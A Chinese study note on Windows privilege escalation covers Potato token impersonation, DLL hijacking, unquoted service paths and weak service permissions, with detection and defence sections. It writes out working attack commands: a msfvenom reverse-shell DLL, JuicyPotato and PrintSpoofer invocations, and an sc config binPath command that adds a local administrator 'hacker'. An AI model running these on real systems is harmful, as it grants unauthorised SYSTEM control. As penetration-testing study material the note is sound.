# 2026-08-28(续) Windows 提权：烂土豆 / DLL劫持 / 引号路径 / 服务权限

> 状态：🧪 理论（课程 + 查证资料），待实操
> 今天第二块：Windows 提权的**服务类/配置类 + 令牌类**打法，承接 08-26 的补丁筛选与 at/sc/ps。核心认知：**很多提权根本不需要 exp——管理员留下的配置错误（服务路径没加引号、目录可写、服务权限过大）和令牌权限（SeImpersonate）就是后门**。参考：0xfisher 八种配置提权路径全景、m0userathxy / 青澜Cyan / zpchcbd 博客园笔记。

## 一、一句话认知

Windows 提权两条主线：
1. **补丁/溢出类**（08-26 已学）：信息收集 → 补丁筛选 → 打对应 CVE/EXP
2. **配置/服务类**（本篇）：不依赖 exp，靠 **服务配置错误**（引号路径/可写目录/弱权限）+ **DLL 加载机制**（劫持）+ **令牌权限**（Potato 家族）——本质都是"**找到一个以 SYSTEM 运行的入口，让系统替我们执行代码**"

> 类比：补丁提权是"撬锁"，配置提权是"钥匙就放在花盆底下"——运维手滑留下的配置后门，比 0day 更常见、更有效。

## 二、烂土豆（Potato 家族）提权 ⭐

### 0. 先补令牌基础（提权前提概念）

- **令牌（Token）**：系统临时产生的"密钥"，相当于账号密码，决定请求属于哪个用户、能否访问资源；无需密码即可访问网络/系统资源；随系统重启才清除。
- **AccessToken 两种类型**：
  - **Delegation Token（授权令牌）**：支持**交互式**会话登录（本地/远程桌面登录）
  - **Impersonation Token（模拟令牌）**：支持**非交互**会话（如 net use 访问共享）；用户注销后 Delegation 会变成 Impersonation，依旧有效

### 1. 烂土豆 = MS16-075

- **定义**：本地提权（**不能用于域用户**），把权限从最低级别提升到 `NT AUTHORITY\SYSTEM`。
- **原理三步**（本质是 **NTLM 中继 + 令牌冒充**）：
  1. **欺骗** `NT AUTHORITY\SYSTEM` 账户通过 NTLM 对我们控制的 TCP 端点进行身份验证
  2. **中间人**这次认证尝试（NTLM 中继）在本地协商出 SYSTEM 账户的安全令牌
  3. **冒充**协商到的令牌——仅当当前账户有权模拟安全令牌（SeImpersonatePrivilege）时才能做到
- **关键前提**：`whoami /priv` 看到 **SeImpersonatePrivilege**（或 SeAssignPrimaryTokenPrivilege）已启用。**服务账户（IIS、MSSQL、MySQL 等）默认有；普通用户级账户没有**。
- **优点**：可靠 / 不用等 Windows 更新（可主动触发） / 多版本通杀（Win7、8、10、2008、2012）
- **一个坑**：微软已禁止同协议 NTLM 回放（SMB→SMB 中继失效），但**跨协议（HTTP→SMB）仍然可用**——Potato 就是靠这个活的。

### 2. Juicy Potato（甜土豆，烂土豆改进版）

- 自定义 CLSID/端口，适用面更广。用法：
  ```
  JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1155 -c {CLSID}
  # -t: 创建进程方式（t=CreateProcessWithTokenW / u=CreateProcessAsUser / *=都试）
  # -p: 要执行的程序   -l: COM 监听端口   -c: CLSID（选 SYSTEM 权限的 COM 对象）
  # -k/-n: RPC 服务器地址/端口（默认 127.0.0.1:135）
  ```
- **-t 选择规则**：开 SeImpersonate 用 `-t t`；开 SeAssignPrimaryToken 用 `-t u`；都开用 `-t *`；**都没开 → 无法提权**。
- **限制条件**：① SeImpersonate/SeAssignPrimaryToken ② 开启 DCOM ③ 本地支持 RPC 135（被改端口用 `-n`；RPC 被禁需找另一台机器远程登录，用 `-k`）④ 能找到可用的 COM 对象（CLSID 列表：`github.com/ohpe/juicy-potato/CLSID`）
- **适用**：IIS/MSSQL 等服务账户拿到的 webshell（一般就是这类权限）。

### 3. Potato 家族演进（选型速查）

| 工具 | 适用版本 | 说明 |
|------|---------|------|
| **Rotten Potato** | Win7/8/10、2008/2012（MS16-075） | 元祖，MSF `ms16_075_reflection` 模块 |
| **Juicy Potato** | Win10 1809 之前 / Server 2016 之前 | 自定义 CLSID，最常用 |
| **Rogue Potato** | 绕过 Win10 1809+ 限制 | 跨机器模式：攻击机 `socat` 转发 135 端口 + 目标机 `RoguePotato -r 攻击机IP -e 程序 -l 端口` |
| **PrintSpoofer** | Win10 / Server 2019+ | 利用 Print Spooler 的模拟令牌，`PrintSpoofer.exe -i -c "cmd.exe"` |
| **GodPotato** | 更通用（.NET） | `GodPotato.exe -cmd "cmd /c whoami"` |

### 4. 防御

阻止攻击者获得 SeImpersonate/SeAssignPrimaryToken 权限（最小权限原则）；即使打满补丁也要限制服务账户权限；升级系统。

## 三、DLL 劫持（DLL Hijacking）

### 1. 原理

- **DLL 搜索顺序**（SafeDllSearchMode 启用时）：① 应用程序所在目录 → ② `C:\Windows\System32` → ③ 16 位系统目录 → ④ `C:\Windows` → ⑤ 当前工作目录 → ⑥ PATH 环境变量目录
- **劫持条件**：一个以 **SYSTEM 运行的进程**（服务/计划任务）尝试加载某个 DLL，但该 DLL **不存在**（或系统目录里没有）→ 系统按顺序搜到**应用程序目录**时命中攻击者放的恶意同名 DLL → 以 SYSTEM 权限执行恶意代码。
- 本质：**"程序加载缺失 DLL 时，谁先放到搜索路径里谁说了算"**——类似水坑攻击，管理员/高权限用户运行该应用就中招。

### 2. 前提与检测

- 前提：① 高权限进程目录**可写**（`accesschk.exe -uwdqs "Users" "C:\Program Files\TargetApp\"`）② 该进程加载**缺失/可替换**的 DLL ③ 能触发进程启动（重启服务/等计划任务）
- **检测（核心是 ProcMon）**：
  - **Process Monitor（ProcMon）**：过滤器 `Operation=CreateFile` + `Result=NAME NOT FOUND` + `Path ends with .dll` + 目标进程 → 列出所有加载失败的 DLL（如 `version.dll`、`msvcr120.dll`）
  - 火绒剑/Process Explorer 分析进程调用模块
  - `tasklist /v /fi "USERNAME eq NT AUTHORITY\SYSTEM"` 找 SYSTEM 进程

### 3. 利用

```
msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=x -f dll -o /tmp/version.dll   # 生成恶意 dll
copy version.dll "C:\Program Files\TargetApp\version.dll"                            # 放到应用目录
sc stop "TargetApp" && sc start "TargetApp"                                          # 触发加载 → SYSTEM shell
```
- **高级技巧：DLL 代理（DLL Proxying）**——恶意 DLL 导出原始 DLL 的所有函数并**转发到真实 DLL**（用 tools.dll/spf.exe 提取导出表 → .def 定义转发 → 编译），同时在 DllMain 执行恶意代码。好处：不影响目标程序正常运行，更隐蔽。
- 配合玩法：DLL 拿到 SYSTEM 进程后可用 MSF incognito（`list_tokens -u` → `impersonate_token "NT AUTHORITY\SYSTEM"`）做令牌窃取。

### 4. 防御

程序用绝对路径/`LoadLibraryEx` + `LOAD_LIBRARY_SEARCH_SYSTEM32` 加载 DLL；应用目录权限收紧（仅 SYSTEM/Administrators 可写）；启用 SafeDllSearchMode（默认开启）；Sysmon Event ID 11 监控高权限进程目录新文件。

## 四、引号路径提权（Unquoted Service Path）

### 1. 原理

- 服务注册的 `ImagePath`（二进制路径）**包含空格但没加引号**（如 `C:\Program Files\My Service\service.exe`）时，系统按空格拆分**从短到长依次尝试**：
  ```
  尝试1: C:\Program.exe          ← 存在就执行它！
  尝试2: C:\Program Files\My.exe
  尝试3: C:\Program Files\My Service\service.exe  ← 真正的服务
  ```
- 如果攻击者对中间目录（如 `C:\` 或 `C:\Program Files\`）**有写权限**，放一个 `Program.exe`/`My.exe` → 服务启动时（SYSTEM）先执行恶意文件 → 提权。
- 本质：**CreateProcess 解析路径的空格歧义 + 目录写权限**。

### 2. 检测

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
# 或
sc qc "服务名"   # 看 BINARY_PATH_NAME 是否含空格且未加引号
# 或 MSF: exploit/windows/local/trusted_service_path
```

### 3. 利用

写恶意 `Program.exe`（msfvenom 生成/编译）到 `C:\` → `sc start 服务名`（或重启系统）→ SYSTEM 执行。工具：PowerUp `Invoke-ServiceAbuse`。

### 4. 评价（为什么说"鸡肋"）

**`C:\` 根目录默认不可写**（普通用户无权限），所以经典利用面有限；真正能用的是**第三方软件装在非标准目录 + 目录权限没加固**的场景（如 `C:\Program Files (x86)\Sangfor\...` 这类），或配合"可写服务二进制路径"一起看。检测容易、利用条件苛刻。

## 五、服务权限配置错误（弱服务权限 + 可写 bin）

> 这是服务类提权里**最实用**的一块（实战常见、利用一条命令）。

### 1. 弱服务权限（Weak Service Permissions）⭐

- **原理**：服务的安全描述符（SDDL）定义了谁可以查/启/停/改服务。如果普通用户对某 SYSTEM 服务有 **`SERVICE_CHANGE_CONFIG`（WP）** 权限 → 可修改 `binPath` 指向任意程序 → 重启服务 → SYSTEM 执行。
- **检测**：
  ```
  sc sdshow "TargetService"        # 看 SDDL 里普通用户组（IU/Users）有没有 WP 权限
  accesschk.exe -uwcqv "Authenticated Users" * /accepteula   # 输出带 w 的就是可利用目标
  ```
- **利用**（两条命令）：
  ```
  sc config "VulnSvc" binPath= "cmd.exe /c net user hacker P@ssw0rd /add & net localgroup administrators hacker /add"
  sc stop "VulnSvc" && sc start "VulnSvc"    # 服务启动失败没关系，命令已以 SYSTEM 执行
  # 或 binPath 指向恶意 exe（msfvenom 生成），重启服务拿 SYSTEM shell
  ```

### 2. 可写服务二进制路径（Weak Service Binary）

- **原理**：服务 exe 所在**目录对普通用户可写** → 直接**替换/覆盖服务 exe**（备份原文件 → 换成恶意 exe）→ 重启服务执行。
- **检测**：`icacls "C:\path\to\service.exe"` / `icacls "C:\path\to\"` 看 Users 是否有 Write/Modify；或 `accesschk.exe -uwdqs "Users" "C:\Apps\backup\"`（输出 `RW Users` 即可利用）。
- **触发技巧**：服务配了**崩溃自动恢复**策略时，`taskkill /f /im backup.exe` 杀掉进程 → 服务管理器自动重启 → 恶意 exe 执行（不用等管理员手动重启）。

### 3. 工具链（自动化检测，省时利器）

| 工具 | 用法 | 覆盖 |
|------|------|------|
| **PowerUp.ps1**（PowerSploit） | `Import-Module .\PowerUp.ps1` → `Invoke-AllChecks` | 未引号路径/可写服务/弱权限/AlwaysInstallElevated/计划任务/DLL 劫持，`Invoke-ServiceAbuse` 一条龙利用 |
| **WinPEAS**（C#，免 PS） | `winpeas.exe` / `winpeas.exe fast` | 全量检测，红/黄/绿高亮可利用项 |
| **PrivescCheck**（PS） | `Invoke-PrivescCheck` | 现代 Windows 更活跃，可出 HTML 报告 |

## 六、总结：本篇四块速查表

| 手法 | 核心条件 | 检测命令 | 利用要点 | 常见度 |
|------|---------|---------|---------|--------|
| **烂土豆（Potato）** | SeImpersonate/SeAssignPrimaryToken（服务账户） | `whoami /priv` | JuicyPotato/PrintSpoofer 选型看系统版本 | 高 |
| **DLL 劫持** | SYSTEM 进程目录可写 + 缺失 DLL | ProcMon（NAME NOT FOUND）+ accesschk | 恶意 dll 放应用目录，重启触发 | 低 |
| **引号路径** | 服务路径含空格未加引号 + 中间目录可写 | wmic/sc qc 筛选 | Program.exe 放到可写目录 | 高（检测） |
| **弱服务权限** | 用户有 SERVICE_CHANGE_CONFIG（WP） | sc sdshow + accesschk -uwcqv | sc config binPath= → 重启 | 中 |
| **可写 bin** | 服务 exe 目录可写 | icacls/accesschk -uwdqs | 替换 exe，taskkill 触发自动重启 | 高 |

**一句话记忆**：四个手法都是"**找 SYSTEM 入口 + 让系统执行我们的代码**"——Potato 靠令牌冒充、DLL 劫持靠加载顺序、引号路径靠路径解析、服务权限靠配置修改。检测工具优先 WinPEAS + PowerUp 一把梭，手动确认再动手。

## 疑问

1. ❓ Juicy Potato 的 CLSID 列表怎么按系统版本选？（win7/win10/server 各版本对应哪些可用 CLSID？）——GitHub CLSID/README 怎么查？
2. ❓ PrintSpoofer / Rogue Potato 的完整利用流程？（PrintSpoofer 具体怎么触发打印服务？Rogue Potato 的 socat 转发细节？）
3. ❓ 引号路径提权在 `C:\` 默认不可写的现代系统上，实战还有多少空间？（非标准安装目录的案例？）
4. ❓ DLL 劫持里 ProcMon 抓到一堆 NAME NOT FOUND 后，怎么快速筛选"能落地"的（目录可写 + 能触发重启）？
5. ❓ `sc config binPath=` 修改服务后会不会留明显痕迹？（事件日志 7045/7040？管理员能否发现？）

## 关联笔记

- [2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md](./2026-08-26-Windows提权-补丁筛选与at-sc-ps提权.md) — 本篇是 Windows 提权第二块：补丁/溢出（上篇） vs 配置/服务/令牌（本篇）
- [2026-08-25(续3)-权限提升概述.md](./2026-08-25(续3)-权限提升概述.md) — 提权概述：③服务器系统(OS)分支的 Windows 落地
- [2026-08-28-数据库提权-五大数据库.md](./2026-08-28-数据库提权-五大数据库.md) — 今天的另一块：数据库提权（拿到 MSSQL/IIS 服务账户权限后，本篇的 Potato/令牌玩法正好接上）
- [2026-08-15-DC1靶机渗透实战.md](./2026-08-15-DC1靶机渗透实战.md) — Linux 侧提权（SUID）对照

## 待实践

- 靶机实操：winPEAS + PowerUp 扫一遍，练习 sc sdshow/accesschk 手工确认
- Juicy Potato 按系统版本选 CLSID 跑一次（注意 1809+ 换 PrintSpoofer/Rogue Potato）
- ProcMon 抓一次真实服务的 DLL 加载失败记录，练筛选
- 看看 08-26 装的 WES-NG 之外要不要把 winPEAS 收进 SecurityTools

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
